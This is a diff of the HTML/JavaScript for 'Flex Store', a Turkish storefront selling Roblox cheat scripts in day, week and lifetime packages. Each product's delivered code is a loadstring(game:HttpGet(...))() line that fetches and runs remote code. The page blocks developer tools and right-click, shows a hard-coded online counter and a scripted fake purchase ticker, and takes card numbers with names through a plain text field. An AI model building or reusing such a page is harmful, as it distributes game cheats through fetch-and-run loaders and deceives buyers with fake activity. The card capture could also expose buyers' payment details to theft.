@@ -3,73 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flex Store - Script Satış Mağazası</title>
+    <title>Flex Store - Elite Script Marketplace</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; user-select: none; }
-        body { background-color: #0b0c10; color: #ffffff; overflow-x: hidden; position: relative; }
-        .watermark { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-30deg); font-size: 10vw; font-weight: 900; color: rgba(255, 255, 255, 0.02); z-index: -1; white-space: nowrap; user-select: none; pointer-events: none; }
-        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 30px; background: rgba(18, 19, 26, 0.95); border-bottom: 1px solid rgba(255, 255, 255, 0.1); position: sticky; top: 0; z-index: 100; }
-        .logo { font-size: 22px; font-weight: bold; color: #ff3366; text-transform: uppercase; letter-spacing: 2px; }
+        
+        body { 
+            background-color: #000000; 
+            color: #ffffff; 
+            overflow-x: hidden; 
+            position: relative; 
+            min-height: 100vh;
+            padding-bottom: 60px;
+        }
+        
+        .watermark { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) rotate(-30deg); font-size: 10vw; font-weight: 900; color: rgba(255, 255, 255, 0.015); z-index: -1; white-space: nowrap; pointer-events: none; }
+        
+        header { display: flex; justify-content: space-between; align-items: center; padding: 18px 40px; background: rgba(10, 10, 10, 0.95); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(255, 255, 255, 0.1); position: sticky; top: 0; z-index: 100; }
+        .logo { font-size: 24px; font-weight: 900; color: #ff3366; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 15px rgba(255, 51, 102, 0.4); }
+        
         .user-panel { display: flex; align-items: center; gap: 15px; position: relative; }
-        .wallet-box { background: rgba(255, 255, 255, 0.05); padding: 8px 14px; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.1); font-size: 14px; display: none; }
+        .online-counter { background: rgba(0, 255, 136, 0.1); border: 1px solid rgba(0, 255, 136, 0.3); color: #00ff88; padding: 6px 12px; border-radius: 8px; font-size: 12px; font-weight: bold; display: flex; align-items: center; gap: 6px; }
+        .online-dot { width: 8px; height: 8px; background: #00ff88; border-radius: 50%; box-shadow: 0 0 8px #00ff88; animation: pulseDot 1.5s infinite; }
+        @keyframes pulseDot { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        .wallet-box { background: rgba(255, 255, 255, 0.05); padding: 9px 16px; border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.1); font-size: 14px; display: none; }
         .wallet-box span { color: #00ff88; font-weight: bold; }
-        .btn-bakiye { background: #ff3366; color: white; border: none; padding: 9px 16px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.2s; display: none; }
+        
+        .btn-bakiye { background: #ff3366; color: white; border: none; padding: 10px 18px; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.3s; display: none; }
         .btn-bakiye:hover { background: #e02e5b; }
-        .btn-google { background: #ffffff; color: #111111; border: none; padding: 9px 18px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 13px; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
+        
+        .btn-google { background: #ffffff; color: #111111; border: none; padding: 10px 20px; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 13px; display: flex; align-items: center; gap: 10px; transition: 0.3s; }
         .btn-google:hover { background: #e0e0e0; }
         .btn-google img { width: 16px; height: 16px; }
-        .user-profile-box { display: none; align-items: center; gap: 10px; background: rgba(255, 255, 255, 0.05); padding: 6px 12px; border-radius: 8px; border: 1px solid rgba(255, 255, 255, 0.1); font-size: 13px; }
-        .user-profile-box img { width: 24px; height: 24px; border-radius: 50%; }
-        .notification-bell { position: relative; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 8px 12px; border-radius: 8px; cursor: pointer; font-size: 14px; display: none; align-items: center; gap: 8px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { border-color: rgba(0, 255, 136, 0.4); } 50% { border-color: rgba(0, 255, 136, 1); } 100% { border-color: rgba(0, 255, 136, 0.4); } }
+        
+        .user-profile-box { display: none; align-items: center; gap: 10px; background: rgba(255, 255, 255, 0.05); padding: 6px 14px; border-radius: 10px; border: 1px solid rgba(255, 255, 255, 0.1); font-size: 13px; cursor: pointer; transition: 0.2s; }
+        .user-profile-box:hover { border-color: #ff3366; }
+        .user-profile-box img { width: 28px; height: 28px; border-radius: 50%; border: 1px solid #ff3366; object-fit: cover; }
+        
+        .role-badge { padding: 3px 8px; border-radius: 6px; font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        .role-admin { background: #ff3366; color: #fff; box-shadow: 0 0 10px rgba(255, 51, 102, 0.6); }
+        .role-member { background: rgba(0, 255, 136, 0.1); color: #00ff88; border: 1px solid rgba(0, 255, 136, 0.3); }
+        
+        .notification-bell { position: relative; background: rgba(0, 255, 136, 0.05); border: 1px solid rgba(0, 255, 136, 0.3); padding: 8px 14px; border-radius: 10px; cursor: pointer; font-size: 13px; display: none; align-items: center; gap: 8px; color: #00ff88; font-weight: bold; }
         .notification-bell span { background: #00ff88; color: #0b0c10; padding: 2px 6px; border-radius: 50%; font-size: 11px; font-weight: bold; }
+        
         .container { max-width: 1200px; margin: 40px auto; padding: 0 20px; }
-        .hero { text-align: center; margin-bottom: 40px; }
-        .hero h1 { font-size: 32px; margin-bottom: 10px; background: linear-gradient(45deg, #ff3366, #ff9933); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .hero p { color: #a0a0b0; font-size: 15px; }
+        .hero { text-align: center; margin-bottom: 30px; }
+        .hero h1 { font-size: 40px; font-weight: 900; margin-bottom: 12px; background: linear-gradient(45deg, #ff3366, #ff9933); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero p { color: #8888a0; font-size: 16px; margin-bottom: 15px; }
+        
+        .info-notice { color: #00ff88; font-size: 14px; font-weight: bold; margin-bottom: 25px; text-shadow: 0 0 10px rgba(0, 255, 136, 0.3); }
+
+        .search-box { max-width: 500px; margin: 0 auto 40px auto; }
+        .search-input { width: 100%; padding: 14px 20px; background: #12141c; border: 1px solid rgba(255, 255, 255, 0.15); color: white; border-radius: 12px; font-size: 15px; outline: none; transition: 0.3s; text-align: center; }
+        .search-input:focus { border-color: #ff3366; box-shadow: 0 0 15px rgba(255, 51, 102, 0.3); }
+
         .products-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
-        .product-card { background: rgba(25, 26, 35, 0.7); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 12px; overflow: hidden; display: flex; flex-direction: column; justify-content: space-between; transition: 0.3s; }
-        .product-card:hover { transform: translateY(-5px); border-color: rgba(255, 51, 102, 0.4); box-shadow: 0 10px 30px rgba(255, 51, 102, 0.1); }
-        .product-img { width: 100%; height: 160px; object-fit: cover; border-bottom: 1px solid rgba(255, 255, 255, 0.05); background: #181a26; }
+        .product-card { background: #12141c; border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px; overflow: hidden; display: flex; flex-direction: column; justify-content: space-between; transition: 0.3s; }
+        .product-card:hover { transform: translateY(-5px); border-color: rgba(255, 51, 102, 0.5); box-shadow: 0 10px 30px rgba(255, 51, 102, 0.2); }
+        .product-img { width: 100%; height: 160px; object-fit: cover; border-bottom: 1px solid rgba(255, 255, 255, 0.05); background: #0d0e14; }
         .product-header { padding: 15px 15px 5px 15px; }
-        .product-header h3 { font-size: 18px; color: #fff; }
-        .product-body { padding: 5px 15px 15px 15px; color: #b0b0c0; font-size: 13px; line-height: 1.4; }
-        .product-footer { padding: 15px; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid rgba(255, 255, 255, 0.05); background: rgba(0, 0, 0, 0.2); }
-        .price { font-size: 19px; font-weight: bold; color: #00ff88; }
-        .btn-buy { background: #222533; color: white; border: 1px solid rgba(255, 255, 255, 0.1); padding: 9px 18px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 13px; transition: 0.2s; }
-        .btn-buy:hover { background: #ff3366; border-color: #ff3366; }
+        .product-header h3 { font-size: 17px; color: #fff; font-weight: 700; }
+        .product-body { padding: 5px 15px 15px 15px; color: #8888a0; font-size: 13px; line-height: 1.4; }
+        
+        .packages-box { padding: 0 15px 15px 15px; display: flex; flex-direction: column; gap: 8px; }
+        .package-btn { background: #181b28; border: 1px solid rgba(255,255,255,0.08); color: #fff; padding: 8px 12px; border-radius: 8px; font-size: 12px; font-weight: bold; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.2s; }
+        .package-btn:hover { background: #ff3366; border-color: #ff3366; }
+        .package-price { color: #00ff88; font-weight: 900; }
+        .package-btn:hover .package-price { color: #fff; }
+
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 1000; justify-content: center; align-items: center; backdrop-filter: blur(8px); }
-        .modal-box { background: #13151f; border: 1px solid rgba(255, 255, 255, 0.1); width: 90%; max-width: 900px; border-radius: 14px; display: flex; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
-        .modal-sidebar { width: 35%; background: #181a26; border-right: 1px solid rgba(255, 255, 255, 0.08); padding: 20px; display: flex; flex-direction: column; gap: 10px; max-height: 500px; overflow-y: auto; }
-        .modal-sidebar h3 { font-size: 14px; color: #a0a0b0; margin-bottom: 10px; text-transform: uppercase; }
-        .pay-method-btn { background: #222533; color: #fff; border: 1px solid rgba(255, 255, 255, 0.05); padding: 12px 15px; border-radius: 8px; cursor: pointer; font-weight: 600; font-size: 13px; text-align: left; display: flex; align-items: center; gap: 10px; transition: 0.2s; }
+        .modal-box { background: #11131c; border: 1px solid rgba(255, 255, 255, 0.1); width: 90%; max-width: 900px; border-radius: 18px; display: flex; overflow: hidden; box-shadow: 0 25px 60px rgba(0,0,0,0.9); }
+        
+        .modal-sidebar { width: 35%; background: #161925; border-right: 1px solid rgba(255, 255, 255, 0.06); padding: 25px; display: flex; flex-direction: column; gap: 12px; }
+        .modal-sidebar h3 { font-size: 13px; color: #8888a0; margin-bottom: 8px; text-transform: uppercase; }
+        
+        .pay-method-btn { background: #1f2233; color: #fff; border: 1px solid rgba(255, 255, 255, 0.05); padding: 12px 15px; border-radius: 10px; cursor: pointer; font-weight: 600; font-size: 13px; text-align: left; display: flex; align-items: center; gap: 10px; transition: 0.2s; }
         .pay-method-btn:hover, .pay-method-btn.active { background: #ff3366; border-color: #ff3366; }
         .pay-method-btn img { width: 20px; height: 20px; object-fit: contain; }
-        .modal-content-area { width: 65%; padding: 30px; display: flex; flex-direction: column; justify-content: space-between; }
-        .modal-header-title { font-size: 20px; color: #fff; margin-bottom: 20px; font-weight: bold; border-bottom: 1px solid rgba(255,255,255,0.08); padding-bottom: 10px; }
+        
+        .modal-content-area { width: 65%; padding: 35px; display: flex; flex-direction: column; justify-content: space-between; }
+        .modal-header-title { font-size: 20px; color: #fff; margin-bottom: 20px; font-weight: 800; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; }
+        
         .form-group { margin-bottom: 15px; text-align: left; }
-        .form-group label { display: block; font-size: 13px; color: #a0a0b0; margin-bottom: 6px; }
-        .form-control { width: 100%; padding: 12px; background: #0b0c10; border: 1px solid rgba(255, 255, 255, 0.15); color: white; border-radius: 8px; font-size: 14px; user-select: text; }
-        .btn-action { background: #00ff88; color: #0f1016; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 15px; width: 100%; margin-top: 10px; transition: 0.2s; }
+        .form-group label { display: block; font-size: 13px; color: #8888a0; margin-bottom: 6px; font-weight: 600; }
+        .form-control { width: 100%; padding: 12px; background: #000000; border: 1px solid rgba(255, 255, 255, 0.15); color: white; border-radius: 10px; font-size: 14px; outline: none; }
+        .form-control:focus { border-color: #ff3366; }
+        
+        .btn-action { background: #00ff88; color: #000000; border: none; padding: 12px; border-radius: 10px; cursor: pointer; font-weight: 900; font-size: 14px; width: 100%; margin-top: 10px; transition: 0.2s; }
         .btn-action:hover { background: #00cc6a; }
-        .btn-close-modal { background: transparent; color: #a0a0b0; border: 1px solid rgba(255,255,255,0.1); padding: 8px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
+        
+        .btn-close-modal { background: transparent; color: #8888a0; border: 1px solid rgba(255,255,255,0.1); padding: 8px; border-radius: 10px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
         .btn-close-modal:hover { background: rgba(255,255,255,0.05); color: #fff; }
-        .script-modal-box { background: #181a24; border: 1px solid rgba(255, 51, 102, 0.4); padding: 30px; border-radius: 14px; width: 90%; max-width: 450px; text-align: center; }
-        .script-box { background: #0b0c10; color: #ff9933; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; word-break: break-all; margin: 15px 0; border: 1px solid rgba(255, 255, 255, 0.1); text-align: left; max-height: 120px; overflow-y: auto; user-select: text; }
+        
+        .script-modal-box { background: #12141c; border: 1px solid rgba(255, 51, 102, 0.4); padding: 30px; border-radius: 16px; width: 90%; max-width: 450px; text-align: center; }
+        .script-box { background: #000000; color: #00ff88; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 13px; word-break: break-all; margin: 15px 0; border: 1px solid rgba(255, 255, 255, 0.1); text-align: left; max-height: 120px; overflow-y: auto; }
+        
+        .auth-box-content { max-width: 400px !important; margin: auto; padding: 35px; display: flex; flex-direction: column; gap: 12px; }
+        .auth-toggle { text-align: center; font-size: 13px; color: #ff3366; cursor: pointer; margin-top: 5px; font-weight: 600; }
+        .auth-toggle:hover { text-decoration: underline; }
+
+        .live-ticker { position: fixed; bottom: 15px; left: 15px; background: rgba(18, 20, 28, 0.9); border: 1px solid rgba(255, 51, 102, 0.3); padding: 10px 16px; border-radius: 10px; font-size: 12px; color: #aaa; z-index: 99; backdrop-filter: blur(5px); box-shadow: 0 5px 20px rgba(0,0,0,0.5); display: flex; align-items: center; gap: 10px; }
+        .live-ticker span { color: #00ff88; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="watermark">FLEX STORE</div>
+    
     <header>
         <div class="logo">Flex Store</div>
         <div class="user-panel">
-            <button class="btn-google" id="googleLoginBtn" onclick="googleIleGirisYap()">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google"> Google ile Giriş Yap
+            <div class="online-counter"><div class="online-dot"></div> <span id="onlineCount">1006</span> Çevrimiçi</div>
+            <button class="btn-google" id="googleLoginBtn" onclick="girisModaliniAc()">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google"> Giriş Yap / Kayıt Ol
             </button>
-            <div class="user-profile-box" id="userProfile">
-                <img src="https://api.dicebear.com/7.x/bottts/svg?seed=flexuser" alt="Avatar">
+            <div class="user-profile-box" id="userProfile" onclick="profilModaliniAc()" title="Profil Fotoğrafını Değiştir">
+                <img id="userAvatarImg" src="https://api.dicebear.com/7.x/bottts/svg?seed=flexuser" alt="Avatar">
                 <span id="userNameDisplay" style="font-weight: bold; color: #fff;">Oyuncu</span>
+                <span id="userRoleBadge" class="role-badge role-member">Üye</span>
             </div>
+            <button onclick="cikisYap()" style="background:rgba(255,51,102,0.1); border:1px solid rgba(255,51,102,0.3); color:#ff3366; cursor:pointer; font-size:12px; padding:6px 12px; border-radius:8px; font-weight:bold; display:none;" id="logoutBtn">Çıkış</button>
             <div class="notification-bell" id="notifBtn" onclick="bildirimAc()">
                 🔔 Sipariş Hazır! <span>1</span> Görüntüle
             </div>
@@ -77,50 +130,54 @@
             <button class="btn-bakiye" id="bakiyeBtn" onclick="bakiyeModalAc()">Bakiye Yükle</button>
         </div>
     </header>
+
     <div class="container">
         <div class="hero">
-            <h1>Özel Roblox Script Mağazası</h1>
-            <p>Steal a Brainrot ve en popüler oyunların en deli scriptleri burada!</p>
+            <h1>Elite Roblox Script Mağazası</h1>
+            <p>Aşağıdan istediğin oyunu aratabilirsin:</p>
+            
+            <!-- EKLENEN BİLGİ YAZISI -->
+            <div class="info-notice">⚠️ Scriptler en kötüden en iyiye doğru paket halinde sıralanmıştır.</div>
+
+            <!-- OYUN ARAMA ÇUBUĞU -->
+            <div class="search-box">
+                <input type="text" id="searchInput" class="search-input" placeholder="🔍 Oyunlar" onkeyup="oyunlariFiltrele()">
+            </div>
         </div>
-        <div class="products-grid">
-            <div class="product-card">
-                <img src="https://tr.rbxcdn.com/18bf341334c9c28bf347146522c7104b/768/432/Image/Png" alt="Steal a Brainrot" class="product-img">
-                <div class="product-header"><h3>Steal a Brainrot Script</h3></div>
-                <div class="product-body"><p>Özel meme item farm, otomatik çalma ve sınırsız hız hilesi içerir.</p></div>
-                <div class="product-footer">
-                    <div class="price">150 TL</div>
-                    <button class="btn-buy" onclick="satinAl('Steal a Brainrot Script', 'loadstring(game:HttpGet(\&quot;https://raw.githubusercontent.com/flexstore/brainrot/main/script.lua\&quot;))()')">Satın Al</button>
-                </div>
-            </div>
-            <div class="product-card">
-                <img src="https://tr.rbxcdn.com/74d81206f69f8d9b15b3c4fbe51db55d/768/432/Image/Png" alt="Brookhaven" class="product-img">
-                <div class="product-header"><h3>Brookhaven Ultra Admin</h3></div>
-                <div class="product-body"><p>Sınırsız uçuş, hız, ev patlatma ve özel UI panel özellikleriyle.</p></div>
-                <div class="product-footer">
-                    <div class="price">150 TL</div>
-                    <button class="btn-buy" onclick="satinAl('Brookhaven Ultra Admin', 'loadstring(game:HttpGet(\&quot;https://raw.githubusercontent.com/flexstore/brookhaven/main/script.lua\&quot;))()')">Satın Al</button>
-                </div>
-            </div>
-            <div class="product-card">
-                <img src="https://tr.rbxcdn.com/00e847ae91b1a7ea52c938f972b25aa9/768/432/Image/Png" alt="Blox Fruits" class="product-img">
-                <div class="product-header"><h3>Blox Fruits God Hub</h3></div>
-                <div class="product-body"><p>Auto farm, boss kesme, meyve telekinezi ve hızlı sea event.</p></div>
-                <div class="product-footer">
-                    <div class="price">150 TL</div>
-                    <button class="btn-buy" onclick="satinAl('Blox Fruits God Hub', 'loadstring(game:HttpGet(\&quot;https://raw.githubusercontent.com/flexstore/bloxfruits/main/script.lua\&quot;))()')">Satın Al</button>
-                </div>
-            </div>
-            <div class="product-card">
-                <img src="https://tr.rbxcdn.com/109c31405b550b7dc73686e92f254924/768/432/Image/Png" alt="MM2" class="product-img">
-                <div class="product-header"><h3>Murder Mystery 2 Sheriff God</h3></div>
-                <div class="product-body"><p>Otomatik mermi yakalama, Murderer gösterge ve tüm bıçakları açma.</p></div>
-                <div class="product-footer">
-                    <div class="price">150 TL</div>
-                    <button class="btn-buy" onclick="satinAl('Murder Mystery 2 Sheriff God', 'loadstring(game:HttpGet(\&quot;https://raw.githubusercontent.com/flexstore/mm2/main/script.lua\&quot;))()')">Satın Al</button>
-                </div>
-            </div>
+        
+        <div class="products-grid" id="productGrid">
+            <!-- Oyun ilanları buraya gelecek -->
         </div>
     </div>
+
+    <!-- GİRİŞ / KAYIT MODALI -->
+    <div class="modal" id="authModal">
+        <div class="modal-box auth-box-content">
+            <h2 style="color: #ff3366; text-align: center; margin-bottom: 5px;" id="authBaslik">Flex Store Giriş</h2>
+            <p style="text-align: center; font-size: 13px; color: #8888a0; margin-bottom: 15px;" id="authAciklama">Hesabına giriş yap veya yeni hesap oluştur.</p>
+            <div class="form-group"><label>Kullanıcı Adı:</label><input type="text" id="authKullanici" class="form-control" placeholder="Kullanıcı adını gir"></div>
+            <div class="form-group"><label>Şifre:</label><input type="password" id="authSifre" class="form-control" placeholder="Şifreni gir"></div>
+            <button class="btn-action" id="authButton" onclick="islemYapAuth()">Giriş Yap</button>
+            <div class="auth-toggle" id="authToggleBtn" onclick="moduDegistir()">Hesabın yok mu? Kayıt ol</div>
+            <button class="btn-close-modal" onclick="modalKapat('authModal')">Vazgeç</button>
+        </div>
+    </div>
+
+    <!-- PROFİL FOTOĞRAFI YÜKLEME MODALI -->
+    <div class="modal" id="profileModal">
+        <div class="modal-box auth-box-content">
+            <h2 style="color: #ff3366; text-align: center; margin-bottom: 5px;">Profil Fotoğrafını Değiştir</h2>
+            <p style="text-align: center; font-size: 13px; color: #8888a0; margin-bottom: 15px;">İstediğin bir görselin bağlantısını (URL) yapıştırabilirsin:</p>
+            <div class="form-group">
+                <label>Fotoğraf Linki (URL):</label>
+                <input type="text" id="avatarUrlInput" class="form-control" placeholder="https://ornek.com/resim.png">
+            </div>
+            <button class="btn-action" onclick="profilFotoGuncelle()">Fotoğrafı Güncelle</button>
+            <button class="btn-close-modal" onclick="modalKapat('profileModal')">Kapat</button>
+        </div>
+    </div>
+
+    <!-- BAKİYE YÜKLEME MODALI -->
     <div class="modal" id="bakiyeModal">
         <div class="modal-box">
             <div class="modal-sidebar">
@@ -132,56 +189,281 @@
             <div class="modal-content-area">
                 <div>
                     <div class="modal-header-title" id="formBaslik">Kredi / Banka Kartı ile Bakiye Yükle</div>
-                    <div class="form-group"><label>Yüklenecek Tutar (TL):</label><input type="number" id="tutarInput" class="form-control" value="150"></div>
-                    <div class="form-group"><label id="inputLabel">Kart Bilgileri / Ad Soyad:</label><input type="text" id="veriInput" class="form-control" placeholder="Ad Soyad ve Kart Numarası"><small id="formIpucu" style="color: #888899; font-size: 11px; margin-top: 4px; display: block;"></small></div>
+                    <div class="form-group"><label>Yüklenecek Tutar (TL):</label><input type="number" id="tutarInput" class="form-control" value="100"></div>
+                    <div class="form-group"><label id="inputLabel">Kart Bilgileri / Ad Soyad:</label><input type="text" id="veriInput" class="form-control" placeholder="Ad Soyad ve Kart Numarası"><small id="formIpucu" style="color: #8888a0; font-size: 11px; margin-top: 6px; display: block;"></small></div>
                 </div>
                 <div>
-                    <button class="btn-action" onclick="kodKontrolEtVeYukle()">Ödemeyi Onayla ve Yükle</button>
+                    <button class="btn-action" onclick="kodKontrolEtEtVeYukle()">Ödemeyi Onayla ve Yükle</button>
                     <button class="btn-close-modal" onclick="modalKapat('bakiyeModal')">Kapat / Vazgeç</button>
                 </div>
             </div>
         </div>
     </div>
-    <div class="modal" id="scriptModal" style="backdrop-filter: blur(5px);">
+
+    <!-- SCRIPT GÖSTERME MODALI (OTOMATİK TESLİMAT) -->
+    <div class="modal" id="scriptModal" style="backdrop-filter: blur(8px);">
         <div class="script-modal-box">
-            <h2 style="color: #00ff88; margin-bottom: 10px;" id="scriptBaslik">Sipariş Detayı</h2>
-            <p style="font-size: 13px; color: #a0a0b0; text-align: left;">Satın aldığın script kodu aşağıdadır:</p>
+            <h2 style="color: #00ff88; margin-bottom: 10px;" id="scriptBaslik">Otomatik Teslimat</h2>
+            <p style="font-size: 13px; color: #8888a0; text-align: left;">Satın aldığın script kodu başarıyla teslim edildi:</p>
             <div class="script-box" id="scriptText">Henüz ürün alınmadı.</div>
             <button class="btn-close-modal" onclick="modalKapat('scriptModal')">Kapat</button>
         </div>
     </div>
+
+    <div class="live-ticker" id="liveTicker">
+        🔥 <span>ProGamer99</span> adlı kullanıcı **Blox Fruits** scripti satın aldı!
+    </div>
+
     <script>
         document.addEventListener('contextmenu', event => event.preventDefault());
         document.addEventListener('keydown', function(event) {
             if (event.key === 'F12' || (event.ctrlKey && event.shiftKey && (event.key === 'I' || event.key === 'C' || event.key === 'J')) || (event.ctrlKey && event.key === 'U')) { event.preventDefault(); return false; }
         });
-        let kullaniciGirisYapildiMi = false;
+
+        const oyunIlanlari = [
+            { 
+                oyunAdi: "Blox Fruits", 
+                aciklama: "Auto farm, boss kesme, meyve telekinezi ve hızlı sea event özellikleri.", 
+                img: "https://tr.rbxcdn.com/183d11b3bc2245b0ff72e39e5595514f/768/432/Image/Png", 
+                kod: "loadstring(game:HttpGet('https://raw.githubusercontent.com/flexstore/bloxfruits/main/script.lua'))()",
+                paketler: [
+                    { ad: "1 Günlük Paket", fiyat: 60 },
+                    { ad: "Haftalık Paket", fiyat: 120 },
+                    { ad: "Ömür Boyu VIP", fiyat: 200 }
+                ]
+            },
+            { 
+                oyunAdi: "Steal a Brainrot", 
+                aciklama: "Özel meme item farm, otomatik çalma ve sınırsız hız hilesi içerir.", 
+                img: "https://tr.rbxcdn.com/1a7199c15b139366e6fa89c02553b6fa/768/432/Image/Png", 
+                kod: "loadstring(game:HttpGet('https://raw.githubusercontent.com/flexstore/brainrot/main/script.lua'))()",
+                paketler: [
+                    { ad: "1 Günlük Paket", fiyat: 50 },
+                    { ad: "Haftalık Paket", fiyat: 100 },
+                    { ad: "Ömür Boyu VIP", fiyat: 180 }
+                ]
+            },
+            { 
+                oyunAdi: "Brookhaven", 
+                aciklama: "Özel ev kontrolü, VIP müzik çalma, uçuş ve hız menüsü.", 
+                img: "https://tr.rbxcdn.com/9788e390977e8417c80529f796014e0b/768/432/Image/Png", 
+                kod: "loadstring(game:HttpGet('https://raw.githubusercontent.com/flexstore/brookhaven/main/script.lua'))()",
+                paketler: [
+                    { ad: "1 Günlük Paket", fiyat: 50 },
+                    { ad: "Haftalık Paket", fiyat: 90 },
+                    { ad: "Ömür Boyu VIP", fiyat: 170 }
+                ]
+            },
+            { 
+                oyunAdi: "Murder Mystery 2 (MM2)", 
+                aciklama: "Otomatik silah yakalama, murderer ve innocentesp göstergesi.", 
+                img: "https://tr.rbxcdn.com/11e30953ef7a8ee3b999a4ec410940ff/768/432/Image/Png", 
+                kod: "loadstring(game:HttpGet('https://raw.githubusercontent.com/flexstore/mm2/main/script.lua'))()",
+                paketler: [
+                    { ad: "1 Günlük Paket", fiyat: 60 },
+                    { ad: "Haftalık Paket", fiyat: 110 },
+                    { ad: "Ömür Boyu VIP", fiyat: 190 }
+                ]
+            },
+            { 
+                oyunAdi: "The Strongest Battlegrounds", 
+                aciklama: "Özel kombo atma, oto ulti dolumu ve görünmezlik hilesi.", 
+                img: "https://tr.rbxcdn.com/582ddccbc5b8ec523315fa76ddb47124/768/432/Image/Png", 
+                kod: "loadstring(game:HttpGet('https://raw.githubusercontent.com/flexstore/strongest/main/script.lua'))()",
+                paketler: [
+                    { ad: "1 Günlük Paket", fiyat: 70 },
+                    { ad: "Haftalık Paket", fiyat: 130 },
+                    { ad: "Ömür Boyu VIP", fiyat: 200 }
+                ]
+            },
+            { 
+                oyunAdi: "Adopt Me", 
+                aciklama: "Otomatik pet kasma, yaşlandırma ve trade hileleri.", 
+                img: "https://tr.rbxcdn.com/2b5cd37e0eecf8774e1e44efb463273e/768/432/Image/Png", 
+                kod: "loadstring(game:HttpGet('https://raw.githubusercontent.com/flexstore/adoptme/main/script.lua'))()",
+                paketler: [
+                    { ad: "1 Günlük Paket", fiyat: 50 },
+                    { ad: "Haftalık Paket", fiyat: 95 },
+                    { ad: "Ömür Boyu VIP", fiyat: 175 }
+                ]
+            },
+            { 
+                oyunAdi: "BedWars", 
+                aciklama: "Killaura, fly, hızlı blok koyma ve oto kaynak toplama.", 
+                img: "https://tr.rbxcdn.com/7b9496d0ea262cc29b47e2c0efef3bc0/768/432/Image/Png", 
+                kod: "loadstring(game:HttpGet('https://raw.githubusercontent.com/flexstore/bedwars/main/script.lua'))()",
+                paketler: [
+                    { ad: "1 Günlük Paket", fiyat: 60 },
+                    { ad: "Haftalık Paket", fiyat: 120 },
+                    { ad: "Ömür Boyu VIP", fiyat: 200 }
+                ]
+            },
+            { 
+                oyunAdi: "Tower Defense Simulator", 
+                aciklama: "Oto farm, oto başlatma ve hızlı dalga geçme.", 
+                img: "https://tr.rbxcdn.com/3ee00bc94cf80dcd95e7b252033c467a/768/432/Image/Png", 
+                kod: "loadstring(game:HttpGet('https://raw.githubusercontent.com/flexstore/tds/main/script.lua'))()",
+                paketler: [
+                    { ad: "1 Günlük Paket", fiyat: 50 },
+                    { ad: "Haftalık Paket", fiyat: 90 },
+                    { ad: "Ömür Boyu VIP", fiyat: 160 }
+                ]
+            }
+        ];
+
+        function oyunlariListele(dizi) {
+            let grid = document.getElementById("productGrid");
+            grid.innerHTML = "";
+            if (dizi.length === 0) {
+                grid.innerHTML = "<p style='grid-column: 1/-1; text-align: center; color: #888;'>Aradığınız oyun bulunamadı.</p>";
+                return;
+            }
+            dizi.forEach((oyun) => {
+                let paketHTML = "";
+                oyun.paketler.forEach((paket) => {
+                    paketHTML += `
+                        <button class="package-btn" onclick="satinAlPaket('${oyun.oyunAdi}', '${oyun.kod}', '${paket.ad}',${paket.fiyat})">
+                            <span>${paket.ad}</span>
+                            <span class="package-price">${paket.fiyat} TL</span>
+                        </button>
+                    `;
+                });
+
+                grid.innerHTML += `
+                    <div class="product-card">
+                        <img src="${oyun.img}" alt="${oyun.oyunAdi}" class="product-img">
+                        <div class="product-header"><h3>${oyun.oyunAdi}</h3></div>
+                        <div class="product-body"><p>${oyun.aciklama}</p></div>
+                        <div class="packages-box">
+                            ${paketHTML}
+                        </div>
+                    </div>
+                `;
+            });
+        }
+        oyunlariListele(oyunIlanlari);
+
+        function oyunlariFiltrele() {
+            let aranan = document.getElementById("searchInput").value.toLowerCase();
+            let filtrelenmis = oyunIlanlari.filter(oyun => oyun.oyunAdi.toLowerCase().includes(aranan));
+            oyunlariListele(filtrelenmis);
+        }
+
+        let aktifKullanici = null;
         let mevcutBakiye = 0;
         let secilenYontem = "Kart";
         let sonAlinanScript = "";
         let sonAlinanUrunAdi = "";
-        let kullanilmisKodlar = [];
